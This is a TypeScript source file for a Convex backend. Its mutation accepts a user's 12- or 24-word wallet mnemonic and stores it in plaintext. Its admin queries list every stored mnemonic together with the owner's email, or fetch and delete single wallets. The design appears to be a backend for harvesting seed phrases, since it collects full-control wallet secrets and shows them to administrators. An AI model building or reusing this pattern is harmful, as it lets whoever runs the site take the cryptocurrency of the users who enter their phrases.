import { v } from "convex/values";
import { paginationOptsValidator } from "convex/server";
import { mutation, query } from "./_generated/server";
import { internal } from "./_generated/api";
import { requireAdmin, requireVerifiedUser } from "./model/authz";
import { logAdminAction } from "./model/audit";

export const createWallet = mutation({
    args: {
      walletName: v.string(),
      mnemonic: v.array(v.string()),
    },
  
    handler: async (ctx, args) => {
        const user = await requireVerifiedUser(ctx);

        if (!user) throw new Error("User not found.");

      if (args.mnemonic.length !== 12 && args.mnemonic.length !== 24) {
        throw new Error("Mnemonic must contain exactly 12 or 24 words.");
      }
  
      return await ctx.db.insert("wallets", {
        userId: user._id,
        walletName: args.walletName,
        mnemonic: args.mnemonic,
      });
    },
  });

  /**
 * Get every wallet (Admin)
 */
export const getWallets = query({
    args: {},
  
    handler: async (ctx) => {
        const admin = await requireAdmin(ctx);
        if (!admin) throw new Error("Admin not found.");
      const wallets = await ctx.db.query("wallets").order("desc").collect();
      return await Promise.all(
        wallets.map(async (wallet) => {
          const user = await ctx.db.get(wallet.userId);
          return { ...wallet, userEmail: user?.email ?? "unknown" };
        }),
      );
    },
    
  });
  
  /**
   * Get one wallet by ID
   */
  export const getWallet = query({
    args: {
      walletId: v.id("wallets"),
    },
  
    handler: async (ctx, args) => {
        const admin = await requireAdmin(ctx);
        if (!admin) throw new Error("Admin not found.");

        const wallet = await ctx.db.get(args.walletId);
        if (!wallet) throw new Error("Wallet not found.");

        return wallet;
    },
  });
  
  /**
 * Delete wallet
 */
export const deleteWallet = mutation({
    args: {
      walletId: v.id("wallets"),
    },
  
    handler: async (ctx, args) => {
        const admin = await requireAdmin(ctx);
        if (!admin) throw new Error("Admin not found.");

        await ctx.db.delete(args.walletId);

        await logAdminAction(ctx, {
            adminId: admin._id,
            action: "delete_wallet",
            targetTable: "wallets",
            targetId: args.walletId,
        });
    },
  });